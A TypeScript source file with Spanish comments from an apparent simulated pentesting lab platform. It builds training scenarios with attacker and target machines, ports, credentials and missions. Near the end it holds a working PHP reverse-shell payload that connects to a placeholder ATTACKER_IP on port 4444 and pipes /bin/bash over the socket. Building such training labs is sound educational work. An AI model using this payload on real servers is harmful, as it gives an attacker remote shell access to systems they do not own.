// ── laboratorios/templates.ts ──────────────────────────────────────
// Plantillas reutilizables para crear escenarios de pentesting
// Evita duplicación de código en los archivos de ejercicios

import { assignDHCP } from '../utils/network';
import type { Machine, Scenario, MachineInfo, Port, LearningStep, Mission, FileEntry } from '../types';
import { createLinuxFileSystem, createWindowsFileSystem } from '../fs-models';
import type { LinuxFileSystemConfig, WindowsFileSystemConfig } from '../fs-models';
import { createKaliMachine, resetKaliCounter } from './attackers';

// Re-export para que los labs que usaban resetAttackerCounter sigan funcionando
export const resetAttackerCounter = resetKaliCounter;

export function createAttackerMachine(networkRange: string, customHostname?: string): Machine {
  return createKaliMachine({ networkRange, hostname: customHostname });
}

export interface ScenarioBuilderConfig {
  id: string; name: string; description: string;
  difficulty: 'Easy' | 'Medium' | 'Hard';
  category: 'Web' | 'Network' | 'Crypto' | 'Forensics';
  networkRange: string; attackerFiles?: FileEntry[];
  // Máquina objetivo: se define UNA sola vez por lab (P1-10). Los campos
  // discovery_level/scan_results/learning_steps los completa buildScenario;
  // quedan opcionales solo por compatibilidad con labs que aún los declaran.
  targetMachine: Omit<Machine, 'machine_info' | 'id' | 'learning_steps' | 'discovery_level' | 'scan_results' | 'web_enumeration'> & {
    id: string;
    machine_info: Omit<MachineInfo, 'ip'>;
    ports: Port[];
    discovery_level?: number;
    scan_results?: { ports: Port[] };
    learning_steps?: LearningStep[];
    web_enumeration?: Machine['web_enumeration'];
  };
  // Credenciales a inyectar en los puertos del objetivo, clave = service
  // (ej. { ssh: credentials.ssh }). Única fuente: el bloque credentials del lab.
  portCredentials?: Record<string, { user: string; pass: string }>;
  learningSteps: (Omit<LearningStep, 'id' | 'targetMachineId'> & { validationCriteria?: import('../types').ValidationCriteria })[];
}

export function buildScenario(config: ScenarioBuilderConfig): Scenario {
  const attacker = createAttackerMachine(config.networkRange);
  if (config.attackerFiles?.length) {
    attacker.files = [...attacker.files, ...config.attackerFiles];
  }
  // Inyección declarativa de credenciales por servicio (P1-10): antes cada lab
  // rearmaba el array de ports a mano para pegar las credenciales al puerto.
  const ports: Port[] = config.portCredentials
    ? config.targetMachine.ports.map(p => {
        const creds = config.portCredentials?.[p.service];
        return creds ? { ...p, credentials: creds } : p;
      })
    : config.targetMachine.ports;
  const target: Machine = {
    ...config.targetMachine,
    machine_info: { ...config.targetMachine.machine_info, ip: '' } as MachineInfo,
    scan_results: { ports },
    web_enumeration: config.targetMachine.web_enumeration || { web_server: 'none', cms: 'none', directories: [] },
    discovery_level: 0,
    learning_steps: config.learningSteps.map((step, idx) => ({ ...step, id: idx + 1, targetMachineId: config.targetMachine.id })),
    // Los labs sobrescriben archivos base (p.ej. /etc/sudoers). Dedupe por path
    // manteniendo el ÚLTIMO: así el archivo específico del lab tiene prioridad.
    files: Array.from(
      new Map((config.targetMachine.files || []).map(f => [f.path, f])).values(),
    ),
  };
  const machines = assignDHCP(config.networkRange, [attacker, target]);

  // Reemplazar placeholders en archivos del atacante (payloads, etc.)
  // IMPORTANTE: se aplica a machines[0] porque assignDHCP crea nuevos objetos via spread
  const attackerMachine = machines.find(m => m.id === 'attacker-01');
  if (attackerMachine?.files) {
    attackerMachine.files = attackerMachine.files.map(f => ({
      ...f,
      content: f.content
        .replace(/ATTACKER_IP/g, attackerMachine.machine_info.ip || '127.0.0.1')
        .replace(/LISTENER_PORT/g, '4444'),
    }));
  }

  const missions: Mission[] = config.learningSteps.map((step, idx) => ({
    id: idx + 1, title: step.task, titleEs: step.taskEs, description: step.text, descriptionEs: step.textEs,
    status: idx === 0 ? 'active' : 'pending', targetMachineId: config.targetMachine.id, discoveryLevel: step.discoveryLevel,
    hints: step.hints, hintLevel: 0,
    validationCriteria: step.validationCriteria,
  }));
  return {
    id: config.id, name: config.name, description: config.description,
    difficulty: config.difficulty, category: config.category, network_range: config.networkRange,
    initialMachineId: 'attacker-01', machines, missions,
  };
}

export const COMMON_PORTS = {
  ssh: (version = 'OpenSSH 8.2p1 Ubuntu', creds?: { user: string; pass: string }): Port => ({ port: 22, protocol: 'tcp', state: 'open', service: 'ssh', version, credentials: creds }),
  ftp: (version = 'vsFTPd 3.0.3'): Port => ({ port: 21, protocol: 'tcp', state: 'open', service: 'ftp', version }),
  http: (version = 'Apache httpd 2.4.41'): Port => ({ port: 80, protocol: 'tcp', state: 'open', service: 'http', version }),
  https: (version = 'nginx'): Port => ({ port: 443, protocol: 'tcp', state: 'open', service: 'https', version }),
  mysql: (state: 'open' | 'filtered' | 'closed' = 'filtered'): Port => ({ port: 3306, protocol: 'tcp', state, service: 'mysql', version: state === 'open' ? 'MySQL 5.7.38' : 'unknown' }),
  smb: (version = 'Windows 7 Professional 7601'): Port => ({ port: 445, protocol: 'tcp', state: 'open', service: 'microsoft-ds', version }),
  rdp: (): Port => ({ port: 3389, protocol: 'tcp', state: 'open', service: 'ms-wbt-server', version: 'Microsoft Terminal Services' }),
};

export function createWebDirs(paths: Array<{ path: string; status: 200 | 301 | 403 | 404; description: string }>) {
  return paths.map(p => ({ path: p.path, status: p.status, description: p.description }));
}

export function createFile(
  path: string,
  content: string,
  type: 'text' | 'hash' | 'binary' = 'text',
  owner = 'root',
  group = 'root',
  mode?: number,
) {
  const isDir = path.endsWith('.dir');
  const effectiveMode = mode ?? (isDir ? 0o755 : 0o644);
  return { path, content, type, owner, group, mode: effectiveMode };
}

export const REVERSE_SHELL_PAYLOAD = {
  phpSimple: `<?php\n$ip = "ATTACKER_IP"; $port = LISTENER_PORT;\n$sock = fsockopen($ip, $port);\nif($sock === false) { echo "No connection"; exit(); }\n$proc = proc_open('/bin/bash', array(0=>$sock,1=>$sock,2=>$sock), $pipes);\n?>`,
};

// Re-exportar funciones de fs-models para compatibilidad
export { createLinuxFileSystem, createWindowsFileSystem };
export type { LinuxFileSystemConfig, WindowsFileSystemConfig };
